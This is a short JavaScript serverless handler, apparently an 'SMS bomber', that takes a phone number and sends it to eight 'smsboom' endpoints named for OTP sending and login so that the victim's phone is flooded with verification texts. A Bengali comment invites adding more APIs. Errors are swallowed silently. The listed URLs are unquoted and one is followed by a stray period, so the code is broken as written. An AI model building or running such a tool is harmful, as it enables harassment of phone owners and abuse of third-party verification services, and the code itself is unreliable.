export default async function handler(req,res){
  const { number } = req.query;
  if(!number) return res.status(400).json({error:"number required"});

  // 🔽 এখানে তুমি API যোগ করবে
  const APIS = [
    https://smsboom.vercel.app/send-otp,
    https://smsbooma.vercel.app/verify-phone,
    https://smsboomc.vercel.app/shikho-send-otp,
    https://smsboomg.vercel.app/bondi-login,
    https://smsboomi.vercel.app/bioscope-login,
    https://smsboomj.vercel.app/send-otp,
    https://smsboomk.vercel.app/send-otp.
    https://smsboomm.vercel.app/send-otp
  
  ];

  for(const api of APIS){
    try{
      await fetch(`${api}?number=${encodeURIComponent(number)}`);
    }catch(e){
      // ignore error
    }
  }

  res.json({ok:true, total: APIS.length});
}
